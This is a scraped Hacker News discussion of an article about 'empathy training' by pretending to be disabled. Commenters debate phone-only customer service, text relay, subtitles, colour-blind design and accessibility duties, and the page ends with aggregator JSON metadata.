lot of people rushed over to help and were quite upset when I hopped up and ran off with the wheelchair.replydrewcoo 20 hours ago | root | parent | prev | next [–] > they are creating animosity and suspicion in the general public who now feel anyone in a wheelchair in the airport is \"cheating\"No. The faceless people who wrote the crap rules are doing that. Blaming people who use the system to their advantage doesn't fix the system.replyjoker_minmax 22 hours ago | parent | prev | next [–] I mention this in my comment too - sexual harassment about the wheelchair I've seen in person.replyomeid2 18 hours ago | parent | prev | next [–] As bad as it seems, without grandfathering, very few of such accessibility laws would ever make it.Consider that accessibility is a quality of life concern, when governments have to consider the cost of everything, even the \"reasonable\" cost of averting death.https://en.wikipedia.org/wiki/Value_of_lifereplyIshKebab 21 hours ago | parent | prev | next [–] The thing I've noticed in the UK with a buggy is the insane lack of dropped kerbs. Why? Does it really cost a lot more to have a slightly different shaped kerb?They also seem to have a terrible habit of putting them in the inconvenient places that they want you to walk, not where people actually walk. E.g. set back 10m from a t-junction. So even if there are dropped kerbs it's still significantly more inconvenient if you actually have to use them.replybombcar 11 hours ago | root | parent | next [–] Dropped kerbs are a moderately expense more, especially in time.And they're rarely retrofitted; there's one missing on a path we take and I always forget about it, and even just a stroller is a pain to get over. I don't see how a wheelchair could; they'd have to go down the (relatively not busy) street to the nearest driveway.replythrow9away6 21 hours ago | prev | next [–] I feel like things have gotten way worse in the last 4 years. Everyone has eliminated the human assistance so if your problem cannot be solved by the standard flow you are out of luck. Many places won’t pick up the phone, there is no way to escalate to a human. If you are disabled you are just a cost center and nobody will bother with you at all.replyhbrav 21 hours ago | prev | next [–] It's kinda disappointing that handling someone being unable to call hadn't occurred to these companies previously. But what's pretty terrible is the attitude of customer service being \"you just have to call, sorry\".This all reminds me of the advice is Patrick McKenzie's blog post \"Identity, Credit Reports and You.\" Specifically: you never want to deal with customer service, they are the Department of Fobbing People Off. You want to be communicating in writing with a lawyer, since lawyers have the power to tell other people in the business \"you're creating liability, make this problem go away\".In this case I think you don't have the same structure as in the credit report case (an act that says they must investigate and respond within X days), so for credibility you probably do need a lawyer writing a letter for you. But I strongly suspect that something like the following will generate a response: \"Dear Sir/Madam,I represent [user]. My client is a customer of your business but is unable to access your services due to [disability]. He has communicated with your customer services (see attached screenshots) and requested they provide a means for him to access these services. Unfortunately they have declined to do so. [Relevant legislation] requires reasonable adjustments to be made in serving disabled customers, and my client and I believe that [adjustment] could easily be made by your business to allow customers with [disability] to access these services. Please advise us within [x days] what adjustments you plan to make to allow my client to access these services.Yours,[Lawyer]\"replyPaulKeeble 20 hours ago | parent | next [–] In my experience finding lawyers to represent you for these injustices is very hard. Disabled people also tend to be poorer and lawyers just aren't interested. Medical abuse of the chronically ill is a big area which lawyers refuse to deal with and it's rife with potential lawsuits. It's not this easy, everyone and I mean everyone treats you like your disposable.replyhbrav 13 hours ago | root | parent | next [–] Very true. This is one of those situations where having a friend who is a lawyer, and willing to write such a letter, is very helpful. It would not be legal to mis-represent yourself as a lawyer. But it's fine to have a lawyer write such a letter, which make the recipient think that you might sue, while having no intention of doing so. This is, of course, completely unfair because the poor, who are more likely to be disabled, are also less likely to have a friend who is a lawyer.replywombatpm 20 hours ago | root | parent | prev | next [–] I believe Prenda Law had a side business in these types of lawsuits when their copyright troll work hit a snag.replythe_other 16 hours ago | root | parent | next [–] Please don't taint essential, but missing, legal support of marginalised people with the tarry brush of patent trolls. Doubly-so when you only \"believe\" the story to be true.replypatmcc 19 hours ago | parent | prev | next [–] I agree with all of this, the only part I want to push back on is: \"But what's pretty terrible is the attitude of customer service being \"you just have to call, sorry\".\"I'm pretty confident in saying it's not the CSR who's deciding this - they probably have either limited access or an explicit directive from above that they cannot do x, y, z in email/chat/whatever. In all likelihood they're an underpaid employee of some outsourced subcontractor to the actual company that decides that.I think we need regulations on this, the same way we need \"if you can sign up from a website, you can cancel from a website\" laws. If you offer x via a phone call, you can offer x via text chat too.replyhbrav 14 hours ago | root | parent | next [–] I agree.replyAffric 5 hours ago | parent | prev | next [–] In Australia, and the UK, you would go to the Ombudsman. At no charge. And your problem would be sorted.replyalexmolas 8 hours ago | prev | next [–] It surprises me that we need an abled person to pretend he's disabled to realize how difficult is to live as a disabled person.Why we don't just hear what disabled people tell us and trust them? Why do we trust the opinion of an abled person more than the opinion of disabled people?Don't get me wrong, I liked the article and it can be eye-opening. But it saddens me that sometimes we forget who's actually suffering this situation, and we empathize with a guy that spend only one week pretending to be disabled more than with actually disabled people.replytheptip 6 hours ago | parent | next [–] They are not advocating for you to listen to them over a disabled person. They are advocating for you to experience it directly, as they did, so you can better understand what it is like.replymavili 20 hours ago | prev | next [–] \"This is discrimination. I don't know sign language and I don't have text relay. I can't use my voice.\"This his reply to instructions telling him he can ask for sign language or use text relay if he cannot use his voice. I hardly see this as discrimination. This is in no way different from a perfectly able person saying it's discrimination to expect me to read and write! Sign language is the language of the voiceless.Life isn't perfect. Of course we should do as much as we can to make life for the disabled easier. But seriously people feel so entitled and expect so much from everyone. People need to accept that not everyone can accommodate 100% of needs. Governments should, but not private entities.replyedent 19 hours ago | parent | next [–] Let's say that tomorrow you get a really bad sore throat. Like, the worst. So bad that you can't speak.How much sign language do you know right now?Disabilities can be temporary or situational. They can be long-term or sudden.replyuserbinator 18 hours ago | root | parent | next [–] No need to use sign language. Had the \"can't speak\" experience after a dentist visit. Took out a piece of paper and wrote down what I wanted to say and showed that instead. These days people would probably use their phone and type it out.replyszatkus 16 hours ago | root | parent | prev | next [–] I would probably use the sign language interpreter option and write down what I want to say on my phone or on paper.(unless they have some weird policy to only serve customers who use sign language)replymavili 19 hours ago | root | parent | prev | next [–] I'd wait until my sore throat is gone. And if I have a disability for longer I'd have to learn to navigate the world my friend. Just like me and you have had to learn to read and write. Funny enough, we also had to learn to use a phone. Oh how dare companies expect us to know use a phone and dial a few digits!replyedent 18 hours ago | root | parent | next [–] And this is why it is called \"empathy\" training.replymajewsky 18 hours ago | root | parent | prev | next [–] Wow, this gas leak looks really bad. Let's hope my sore throat gets better quickly so I can call for help about this.replykvetching 19 hours ago | parent | prev | next [–] Hilarious that people downvoted this.The writer is fooling you all. Virgin literally provided solutions to his issue. A text relay service is the answer if you must speak on the phone. I remember using AT&T text relay as far back as early 2000s. Any person that can't speak would be totally familiar with this solution.replyKye 18 hours ago | parent | prev | next [–] It's actually not uncommon for deaf kids to be forbidden or discouraged, depending on era and local pedagogy, from learning and using sign language. And like any language, it's harder to learn later in life. ASL isn't just English with handwaving. It's a whole other language. Same with all sign languages.replyxyzelement 18 hours ago | prev | next [–] Great article and a good reminder to focus on accessibility.There's good news though. Although being disabled is difficult, it is less difficult now than at any other period in history. The amount of awareness, accommodation, accessibility focus, etc is maximum right now and it's only going to continue. It's important to keep this progress in mind as we work to further improve things.Another point is that people living with disabilities have years or decades of expertise, something that someone \"cosplaying\" (to use the author's word) has no access to. A cosplayer wouldn't know which streets are easiest with a wheel chair or which companies have the most accessible websites. An actual disabled person has this sort of knowledge and would navigate it far better than a \"tourist\"There's lot of work to be done but it's important to acknowledge what's better than it may seem at first.replyAndrewKemendo 22 hours ago | prev | next [–] > Whether you work in tech or not - it is your duty to make sure that no one feels demoralised or rejected because of the systems you build.Shouting into the windUntil the financial incentives of investors, employees and customers align this will never be a priorityreplyCoastalCoder 21 hours ago | parent | next [–] > it is your duty to make sure that no one feels demoralised or rejected because of the systems you build.Making such an assertion is easy.In fact, I've heard many, incompatible claims about duties that supposedly apply to me. Mostly without supporting arguments.replyAndrewKemendo 21 hours ago | root | parent | next [–] It's true, there's equal objective \"support\" for normative ethics claims across the board. So you can prove Nazi fascism is \"correct\" using the same process that you would to prove altruistic liberalism.Given that existential nihilism concludes with \"it's up to you to choose what is right\" my question to you is:Why would you actively choose a position that would be considered anti-social instead of a position that would be considered pro-social if they have the same objective grounding?replyCoastalCoder 19 hours ago | root | parent | next [–] > Why would you actively choose a position that would be considered anti-social instead of a position that would be considered pro-social if they have the same objective grounding?This simplifies away some crucial details about the actual situation.For example, I have limited time and opportunities. Spending 200 hours making a piece of software more handicap-friendly may mean 200 hours less of being a good parent to my kids. Or working at a homeless shelter.We can probably agree that all 3 activities are \"pro social\" in some manner. But I can't tackle all of them. Part of growing up is accepting that you can't do everything.I'm open to changing my priorities, but not without good justification.replyAndrewKemendo 14 hours ago | root | parent | next [–] Well I was actually responding to your assertion that (paraphrasing) you haven’t been convinced that you have an social obligationThat’s what I’m saying, if you can choose your philosophy, why choose one that is antisocial.replythreatofrain 13 hours ago | root | parent | next [–] He’s saying it’s not antisocial because he’s a better judge on how he wishes to expend himself for society.replyklabb3 18 hours ago | root | parent | prev | next [–] > Why would you actively choose a position that would be considered anti-social[…]Isn’t anti-social a very loose and subjective term? Using your own example, wouldn’t it be considered anti-social in Nazi Germany to oppose mainstream culture like military parades, Hitler-Jugend etc?replyAndrewKemendo 14 hours ago | root | parent | next [–] To be clear when I say “antisocial” Vs “prosocial” it is in the specific context of psycho-social evaluation where:Prosocial: “benefit other people or society as a whole”Antisocial: “considered to be disruptive to others in society”https://en.m.wikipedia.org/wiki/Prosocial_behaviorhttps://en.m.wikipedia.org/wiki/Anti-social_behaviourreplys1artibartfast 10 hours ago | root | parent | next [–] I think this is a false dichotomy.It would be pro-social if I donated my wealth to charity, killed myself, and donated my organs... But I don't want to do that.Does that make me antisocial? Is there no middle ground?replyAndrewKemendo 2 hours ago | root | parent | next [–] It’s more like, is each action you take as you go through life more antisocial or more prosocial?I’m sure even Richard Kuklinski held a door open for someone, at some pointreplycharcircuit 20 hours ago | root | parent | prev | next [–] Not everyone is social. Some people want to build what they want even if that means a group of people will be excluded.replyAndrewKemendo 19 hours ago | root | parent | next [–] This is simply saying that you do not have, and do not desire to acquire, the emotional capacity to be satisfied with the social trade offs of voluntary subordination of a portion of your own personal desires to benefit the desires of others who may also want to commune with you.So if your proof claim is simply “I don’t want to” then it’s entirely ignoring the question with the idea that it’s not your choice anyway - you’re just born that way - which is not a relativistic statement.In fact it’s a biological determinism argument and if you would like to go down that hole I think it would yield that your claimed antisocial “preference” is extremely rare historically - to the extent where as an outlier it’s questionable if it is an evolutionary fitness trait or if it’s ultimately supporting a genetic brick wall.replys1artibartfast 18 hours ago | root | parent | prev | next [–] >Why would you actively choose a position that would be considered anti-social instead of a position that would be considered pro-social if they have the same objective grounding?Because one positions imposes significant costs and restrictions, leaving your life significantly worse off.Paying taxes to support the welfare of others is pro-social, but it means that I am laboring twice as much, instead of relaxing with my friends an family. It means that I am paying for the children of others using resources I would rather devote to my children. Why should I sacrifice my wellbeing for someone I don't know, and might not even like if I met them.Many behaviors that fall under the Pro-social labor hurt the individual and benefit others.If they are actually beneficial to the individual, they wouldn't need to be compulsory or the pro-social rhetoric.replyshrimp_emoji 21 hours ago | root | parent | prev | next [–] The pettiest example of this is red-green colorblindness (the overwhelmingly most common kind of colorblindness).Many interfaces, such as git's, use red and green despite the common (?) knowledge that red and blue are the preferred combination for accessibility.I think most people prefer red and green, though.So there's incompatible concerns to cater to: do you demoralize most people by switching to blue or do you demoralize the colorblind minority by keeping green? :D(In the limit, you're going to inevitably hit some bedrock of elitism beyond which it's irrational to dig. Your interface will probably not be usable by dogs, for example.)replywheybags 19 hours ago | root | parent | next [–] Coming at this from a gamedev perspective - imo, if you can, the best solution is to never use colour alone to convey information. For example, you can have a blue and a red thing, but the blue one also has spots. Or it's a dark blue, and the red is light. Or the blue thing is a diamond and red thing is a circle, etc etc. This has the added benefit that it helps everyone, not just the colourblind.replynitwit005 18 hours ago | root | parent | prev | next [–] I assume you mean github, rather than git? It's not reliant on the colors. The \"Code\" and \"New Pull Request\" buttons are green, but they also have text on them. Various icons also have assistive text.There are quite a few variations of color blindness, so ultimately you want color to just be a hint. Handling the most common case is a partial fix.replywolfgang42 14 hours ago | root | parent | next [–] I think they’re talking about the coloring in `git diff`, `git log --patch`, etc, which defaults to red/green for removed/added lines, respectively. (This can be changed with the `color.diff.*` config options, as seen in git-config(1).) This UI also provides an alternative indication, in the form of -/+ indicators in the left column, but the coloring does help a lot—presuming that you can see it.replyAndrewKemendo 21 hours ago | root | parent | prev | next [–] >So there's incompatible concerns to cater to: do you demoralize most people by switching to blue or do you demoralize the colorblind minority by keeping green? :DI'm not sure what to say here to be honest because you're comparing these two things as equal with \"demoralized\" being the only downside somehow so lets see what the implications to the people are of such a system, using your own example:- A disabled person not being able to functionally use a system that is often required for their work- A non-disabled person being able to functionally use a system that is often required for their work, but the text is a less preferable colorIn the first case it will take someone with an involuntary disability longer, with more difficulty, to perform the same task (comprehension) as someone without the involuntary disabilityI'm not sure how you could possibly equivocate these - and then further double down on lack of empathy by suggesting that making a website easier to use for risks a slippery slope of irrational accessibility requirementsUnreal that this has to be spelled outreplyrjaco31 20 hours ago | root | parent | prev | next [–] Just add a toggle for a colorblind modereplyjosephg 21 hours ago | parent | prev | next [–] > Until the financial incentives of investors, employees and customers align this will never be a priorityIn some parts of the world, disabled people can sue businesses over accessibility issues. People complain about the “disability mafia” shaking down businesses, but I think it might be the only way to align incentives to actually get these problems reliably addressed.replyWowfunhappy 21 hours ago | root | parent | next [–] > People complain about the “disability mafia” shaking down businesses, but I think it might be the only way to align incentives to actually get these problems reliably addressed.But IMO the other side of this is also tricky, because you don't want companies to respond by removing services for everyone.There was an article on here the other day about how a town had a non-ADA-compliant crosswalk. Fearing a lawsuit, the town addressed the issue... by removing the crosswalk. (You could still cross the street—with a wheelchair, even—but you had to walk much further to do so.)I also remember the article about the California university—was it Berkley?—where some professors posted their lectures freely online for members of the public. Of course, they didn't have the resources to go through and add subtitles—these lectures were for non-students, they didn't generate any revenue—and the university got sued. Obviously, they responded by pulling down the lectures.Situations like these just make everything worse for everyone. How do we write regulations which avoid that?replyzo1 8 hours ago | root | parent | next [–] You make it illegal for people to profit off of the regulation? Make it so the only \"money\" they get is in the form of paying doctors, psychiatrists and counselors. Raise the bar to prove that monetary compensation is needed. Also, stop using this mechanism to \"punish\" companies. Punish them by forcing them to comply, not by taking money from them and giving it to victims. That part is the one that creates a perverse incentive for people to take advantage.Edit. Make it so it's legal to sue people that profit (money) off of this, at least the lawyers involved or ones that advertise these kinds of services.So many ways to solve it. Too bad we as a society are stuck in a rut and can't undo bad choices or change direction easily. If you go down this path, be prepared for the onslaught of \"you hate the disabled\" from the entrenched interests. Some of which will be plain old disability advocacy groups that generally do good but also got stuck in this path and are captured by profit-seekers.replylijok 18 hours ago | parent | prev | next [–] I would argue it's actually an educational problem, not an incentive problem. Most people (made up stat) would struggle to name/describe any disabilities beyond immobility, blindness and maybe handful of others. Then add in the lack of tools and aids (in the form of popular references, guides and QA forums) available and you have a problem.replylijok 18 hours ago | parent | prev | next [–] > it is your duty to make sure that no one feels demoralised or rejected because of the systems you buildWhat a beautiful quip.What if I'm building driving theory testing software? That's a very on the nose example. What about ticketing systems? Reminder app? TODO app? Wishlist functionality?replyprogramzeta 18 hours ago | root | parent | next [–] Thank you for asking this, it helped tease out and crystalize some thoughts I’ve had about the difference in tenor between computer programming and software engineering. I hope these off-the-cuff answers help explain why this doesn’t feel quippy to me; they are specific in scope but those scopes are common.—Write clear error messages that provide a way forward. Accept your system will have bugs, and ensure the system state is communicated to the user so they know if their TODO/Test/Reminder/Wish was stored/updated/deleted. Do your utmost to prevent data loss - even when that data hasn’t been formally introduced to your data storage of choice.Developers should not worry about their sprints being blown because they have to use your APIs. Teams trying to pass off tasks or getting special commendations for dealing with your software should be embarrassing. If developers are wrapping your API in their API, are they doing it because they need the abstraction or because abstracting it once and tracking changes is easier than using it?Ensure there are logs in place to assist debugging and documentation catered towards end-users, operations, support, and developers. Track relevant metrics to allow for automated fixes and manual intervention so users aren’t the ones having to remind you your software is broken.Every piece of software has a user - a person, an organization, other code - and software that doesn’t make the user’s life easier increases the chance they’ll stop using it.Or worse, start using it incorrectly!replycoffeebeqn 22 hours ago | parent | prev | next [–] That will never happen? Ergo government regulationsreplythrowawa14223 22 hours ago | parent | prev | next [–] Or other people don't believe it to be a deontological style duty.replyAndrewKemendo 21 hours ago | root | parent | next [–] I don’t disagree with you, however we are talking about real people in society, not a theoretical philosophical system. I’m unaware of any wide scale explicitly adopted philosophy wherein there is zero responsibility from individuals to care for others or society.I am curious though what you would describe as your personal philosophy, or if you’re not talking about yourself then what ethics framework are you referring to living inside that does not have a normative component.Maybe a better way to ask it is: what relativistic philosophy is dominant enough or otherwise adopted to such an extent that people are able to functionally live underneath it without any type of a-priori responsibility to others.What I DO see however are people who reject responsibility for others, yet accept or even demand support from others - even if it’s tacit - and then hold a position like you describe.So I remain suspect of anyone promoting some extreme version of individualism, as it conflicts with not only biology, but the entire history of societies and philosophies.replyquickthrower2 10 hours ago | parent | prev | next [–] That is said as if engineers have exactly zero influence. We are hired to build stuff (and often wearing many hats: UX, design, architecture, market research etc.). I bet if someone said \"you have to use Win11 and not allowed a mac\" there would be a revolution at many companies :-)replyzer8k 21 hours ago | parent | prev | next [–] > it is your duty to make sure that no one feels demoralised or rejected because of the systems you build.This is the most dangerous line of thinking and one of the many reasons people are tiring of woke-ism. Most reasonable people agree accommodations for the disabled are both smart from a business perspective, and kind to patrons in general. To reframe having objections to this as a \"demoralization\" and \"rejection\" that needs \"special training\" to understand seems more like the schizophrenic sociologists are off their meds again.Importantly, I have no duty to anyone except my family. I am not obligated by anyone to do anything for you. This is not to be interpreted as me not having empathy for the disabled. But it is not my obligation to do anything about it. I have worked specifically in this industry helping the visually impaired navigate websites better. However, I cannot afford to do such a design for my own personal sites. These types of prescriptive ultimatums are exhausting and when they're codified into law they have an unintended chilling effect.replymajewsky 18 hours ago | root | parent | next [–] > Most reasonable people agree accommodations for the disabled are both smart from a business perspective, and kind to patrons in general.If that were true, then given the evidence presented in the post and in this thread, the corollary would be that a significant amount of large businesses are run by unreasonable people.replyzmower 21 hours ago | prev | next [–] Ah, cancelling Virgin Media. I've done this recently. I got upset. I shouted down the phone at them. I'm not surprised they're being invetigated by OFCOM https://www.theguardian.com/media/2023/jul/13/ofcom-investig...replyNexxxeh 9 hours ago | parent | next [–] Took me well over an hour to cancel.When the guy in the OP explained his experience, all I could think was, \"That's equality. An overwhelmingly shit customer service experience to all, disabled or not.\"I'm currently stuck with someone else's email account in my authorized users, a phone number as my contact number that I can't update (known VM issue atm apparently), and an strong desire to send their CEO recordings of me screaming.replyjsnell 21 hours ago | prev | next [–] Most of the example challenges feel pretty odd.> Go a couple of weeks without using the phone. Which services are closed off to you?I think I've called a service provider of any kind once in the last five years. It didn't actually get me anything that text comms would not have.> Tell people you need an accessible venue for your meetings. How do they respond?The last time I spoke at a venue was like 8 years ago. The author doing it multiple times in a random week seems like quite an outlier.> Switch on subtitles and mute your favourite shows. Do they even have subtitles? What do you miss?I always have subtitles on in any TV show, streaming show, YouTube, etc. I can't even think of the last time it wasn't an option. (The subtitles for the news have a 15 second delay due to it being a real-time broadcast, which is a bit distracting but acceptable.)replydkarl 21 hours ago | parent | next [–] I've had to use the phone quite a bit in the last year. Airlines and travel companies are especially bad about only supporting happy-path functionality online and then providing an excruciatingly bad phone experience if something gets off-track.The pharmacy that I use has a very busy and probably very expensive web site, but it has bugs, and any time you get off the happy path, you have to call. For example, when I get a prescription delivered for my brother-in-law (who has disabilities and lives with us) the pharmacy only gives the name on the credit card to the delivery driver (this is a known bug, for over a year) so the driver shows up and asks for the wrong name. Usually the pharmacist figures this out and gives them the right prescription, but if they don't, the prescription goes into a black hole. It can't be picked up at the pharmacy, it can't be scheduled for delivery again, nothing can happen until I call and get it fixed.Helping my mother set up online access to her pension, the only way they will grant her access is if they call her at a certain number and she answers the phone.I can't think of any other examples off the top of my head, but I despise talking on the phone and will go to great lengths to avoid it, and yet I have to do it maddeningly often.replyZak 20 hours ago | root | parent | next [–] > Airlines and travel companiesI actually found Twitter DM, of all things to be the most effective way to get customer service from United Airlines. I don't know if this is still the case given Twitter's recent decline.replyalex_suzuki 19 hours ago | root | parent | next [–] Anecdotal, but I have also found Twitter DM to be a highly successful communication channel when you need support. I’m assuming that a) it’s the fear of being publicly shamed and b) it’s a channel that’s not made completely unusable through some kind of helpdesk software.replyZak 17 hours ago | root | parent | next [–] Complaining about corporations in public posts is all I've ever used Twitter for. It sometimes results in better support channels than the default.replyedent 19 hours ago | parent | prev | next [–] Hi, I wrote the article 4 years ago. So, slightly within your 5 years timeframe.There are still plenty of services in the UK which are only available by voice.I may be \"an outlier\" but it was my lived reality. At the time I was travelling to and speaking at multiple events per week. Why should I be able to do that when others are prevented?In the last 4 years the situation with subtitles has improved slightly. But there are still plenty of shows on Netflix and Apple+ with no subtitles or - perhaps worse - shitty subtitles.I'm really pleased that you haven't experienced any of these barriers. Can I please encourage you to find something that you think might be a challenge and spend a few weeks building up your empathy?replyhereforthecake2 21 hours ago | parent | prev | next [–] > I think I've called a service provider of any kind once in the last five years. It didn't actually get me anything that text comms would not have.It sounds like what you are implying is that because you haven't experienced it in a 5 year period, someone who lives their entire life like this must not experience this as well? Even though you are presented with data saying otherwise?replyjsnell 21 hours ago | root | parent | next [–] No, I'm implying nothing like that.The challenge the author set was to go without a phone for a \"couple of weeks\", not \"for your entire life\". For that to be a useful challenge and build empathy as is the goal, the people taking the challenge need to be put into a position where they must make a phone call at least once in those two weeks. Otherwise it does nothing at all.The author appears to be upgrading their internet connection, moving, and arranging financing for a house in their totally normal week. For them, it is a useful challenge. But for my phone use patterns it is utterly useless. I'd need to run the experiment for a decade.But thanks a lot for telling me that my lived experience is invalid and disproven by \"data\".replymitthrowaway2 21 hours ago | parent | prev | next [–] For some reason Crave in Canada on AppleTV seems to have no subtitles whatsoever. I can't understand why.replychronicsonic 20 hours ago | root | parent | next [–] This might be related to Apple, normally Apple is very good for accessibility, but even the BBC has challenges with subtitles on AppleTV, same with the Dutch NPO TV:“Why are there no subtitles on BBC iPlayer via Apple TV?There are technical challenges associated with delivering subtitles to Apple TV which will require a significantly different solution to that which we use on all other platforms. We are working towards it but don't currently have timelines associated with this support.”Source: https://www.bbc.co.uk/iplayer/help/questions/accessibility/a...replymitthrowaway2 19 hours ago | root | parent | next [–] Makes sense, but it's clear that we still don't live in a world of fully ubiquitous subtitle accessibility, which can cause trouble both for the hard of hearing and for those with English as a second language.Likewise, subtitles usually are not available at theatres, public screenings, and other venues.replynavjack27 21 hours ago | parent | prev | next [–] So just because you could argue about all of these, they are all invalid?replyjsnell 21 hours ago | root | parent | next [–] I did not use the word \"invalid\", or anything like that. You've made that up.The author seems to think that this list is compelling, and that people will find it incredibly hard to do these challenges. But at least half the list is describing stuff that I know with certainty would be no trouble because it is either stuff I already do all the time, or has boundary conditions that have aTerence: If I want to cancel my account (without using the phone) what can I do?> John: the only option though is by calling .Comcast told me this exact same thing but I just told them that section 9(a) of their Xfinity Residential Services Agreement allows for termination by e-mail and that I was providing the agreed notice and will withhold payments effective immediately. They shut up after that.I'm not deaf but I've claimed to be on multiple occasions to avoid dealing with a customer service phone call. They want me on the phone? Pay me for my lost hours.replymojomark 9 hours ago | prev | next [–] I read this post and have cancelled my Verizon service for a local alternative.Stellar work Verizon.replybaz00 19 hours ago | prev | next [–] Cursed with the two shittiest UK organisations in existence there. Having dealt with Virgin Media and Thames Water for years they are quite frankly abhorrent even if you don't have a disability. From piss and rubbish filled street junction boxes and outages for days at a time to poor maintenance leading to a lingering smell of shit and mosquitos that actually devalued property in my area, they should be utterly shafted by everyone who can for every mistake they make.Vote with your feet if you can.replyl0b0 16 hours ago | prev | next [–] I got into web accessibility early in my career, and would've probably done a lot more work there if anyone anywhere had given two shits. Trying to prioritise even basic stuff like alt text or keyboard shortcuts for the most important parts of a site were not interesting to any employers. Accessibility is really just an afterthought even when companies claim to be doing it.replylamontcg 17 hours ago | prev | next [–] I have to actually deal with stuff like this in real life with my disabled Mother, but for some reason this article just irritates me.Reads like its preaching to a bunch of liberals engaged in self-flagellation so they feel like they have empathy, but nothing is actually going to get done.Anyone going to form a Union at work so that people can work together to effectively push back on Management cutting support budgets and implementing dark patterns and just outright neglecting disabled people, or will it just be enough that we all feel bad about this and nothing will happen?replyXenoamorphous 8 hours ago | prev | next [–] I just had to have a baby and take a pushchair everywhere to see how not accessible a lot of places are.replySirMaster 17 hours ago | prev | next [–] I'm confused.Wouldn't a person with no voice simply use a text-to-speech system to communicate over the phone?It doesn't look like they tried any such thing.replyKhelavaster 22 hours ago | prev | next [–] It's a little obtuse to \"pretend to be deaf\" and not use text relay...replyBroken_Hippo 21 hours ago | parent | next [–] No, it really isn't.I mean, I woke up one day and was half blind. Well, I could see out of my left eye, but it was all a blur. \"Yes, I know that's a big E at the top of the eye chart, but it is a dark and light blur\".I've had both hands go numb. I could use them, mostly, but had to look at them to properly wash bread dough off of my hands. I couldn't feel it.These things mostly got better after some time - I have MS, you see. It wouldn't be realistic to think that I could wake up and not be able to use my voice effectively or have some sort of hearing problem. Or not be able to walk well. Or a number of different things. And at least at first, I'd not think to use text relay either. I might not think about it for a few weeks - it might get better, after all. In the meantime, I'd be getting increasingly frustrated at society.replyRhapso 22 hours ago | parent | prev | next [–] Wait until you find out 20% of the deaf are illiterate. Want to make the world more accessible, learn ASL and see to it the education and healthcare systems get real funding.*Ironic typo mention below is fixed.replyhereforthecake2 21 hours ago | root | parent | next [–] > Wait until you find out 20% of the deaf are illerateOr that the average reading level of people that are deaf in the US in 4th grade.replyHideousKojima 20 hours ago | root | parent | next [–] The median US adult only reads at an 8th grade level, so that's actually not terribly surprising.replyYurgenJurgensen 18 hours ago | root | parent | prev | next [–] Learning ‘American’ sign language won’t make the ‘world’ more accessible. Most deaf people aren’t American.replytechsupporter 16 hours ago | root | parent | next [–] That's true for the entire language but, like a lot of other languages, there is significant overlap. For example, the American in American Sign Language means North American; it is the predominant manual language in Canada and the United States and has fairly wide acceptance in Mexico.ASL is based on LSF, or French Sign Language, because of a long history (more or less involving the person with the last name Gallaudet) but the main point is that a lot of sign languages descend from LSF. Much like how someone who only knows English can go to Germany or France or Italy and make out some of the basic words, the overlap between LSF descendants is pretty good for basic or everyday use. I'm semi-fluent in ASL and I've successfully communicated with people who use Irish Sign Language and German Sign Language (DGS).The big stand-out is British Sign Language, or BSL. BSL's manual alphabet and root signs are dramatically different from LSF. (Since a lot of ASL words are initialized motions, like taking the first letter of the English or French word and using that handshape sign in a motion, BSL doesn't translate as quickly.)replyjoker_minmax 17 hours ago | root | parent | prev | next [–] I think the obvious solution here is to have sign language fluency be encouraged in whatever country you particularly live in. I think that person meant \"world\" as a figure of speech.replyRhapso 18 hours ago | root | parent | prev | next [–] Well the competitor is Chinese sign language and the Chinese government claims there are 4 million fluent signers of it. (Which would be the overwhelming majority of people who sign on the planet if it is true) so if you want to improve your raw odds of helping use that.Yes, I failed to be inclusive of other sign languages. Learn the sign language that makes sense for your culture and environment, but learn a sign language!replyslater 21 hours ago | root | parent | prev | next [–] illerate, ey? /sreplyjrmg 7 hours ago | parent | prev | next [–] The ability to use these services is built in to modern phones.iPhone, for example: https://support.apple.com/en-us/HT207033replyOJFord 22 hours ago | parent | prev | next [–] He was pretending to be dumb, not deaf, but yes seems that should still work and realistically what you'd do.I can understand not taking pretending as far as using a wheelchair though, seems you could too easily end up in situations where you have to try to explain No no I'm on the side of people with disabilities, I'm not taking the piss, etc.replymistercow 22 hours ago | parent | prev | next [–] They didn’t pretend to be deaf. They pretended to have a speech disorder that prevented them from using their voice.replyanigbrowl 22 hours ago | root | parent | next [–] Correct, but such a person would normally still have/use text relay.replycatchnear4321 22 hours ago | root | parent | next [–] like a chat widget on a web page?the companies could take the burden here. it isn’t that difficult.replyKarunamon 22 hours ago | parent | prev | next [–] This struck me as well. Not using the service whose entire reason for existence is \"sometimes you need to use the phone and there are no equivalent options\" seems like a self-own unless I am missing something.At least in the United States there are various apps and sites you can use that are free that will provide relay services. I had to avail myself of this a few times when some respiratory bug made me impossible to understand speaking but I could still type.replyjeroenhd 21 hours ago | root | parent | next [–] The UK has this app: https://www.relayuk.bt.com/Seems free and easy to use, for both deaf people and people who can't use their phone. Available though smartphones or dedicated devices.I think it's completely fair to expect someone to use this service for the occasional phone call.reply 11 more comments...",
    "originSummary": [
      "The first text describes the author's personal experiences during empathy training, specifically pretending to have disabilities.",
      "The second text addresses the challenges that individuals with disabilities face and shares the author's personal experience with empathy training.",
      "Both texts emphasize the importance of empathy and encourage others to engage in empathy-building exercises.",
      "The third text provides statistics on the number of blog posts published each month since 1987, highlighting variations in frequency and some months with no posts.",
      "Additionally, the total number of posts for each year is mentioned in the third text."
    ],
    "commentSummary": [
      "The discussions focus on accessibility for individuals with disabilities.",
      "They explore challenges faced by wheelchair users and those with mobility issues.",
      "Lack of accessibility in public spaces and transportation systems is highlighted.",
      "The importance of making necessary accommodations is emphasized.",
      "The impact of disabilities on technology, customer service, and social interactions is discussed.",
      "Inclusive design and systemic changes are advocated for a more accessible and inclusive society."
    ],
    "points": 400,
    "commentCount": 266,
    "retryCount": 0,
    "time": 1690732416
  },
  {
    "id": 36935041,
    "title": "What's up, Python? The GIL removed, a new compiler, optparse deprecated",
    "originLink": "https://www.bitecode.dev/p/whats-up-python-the-gil-removed-a",
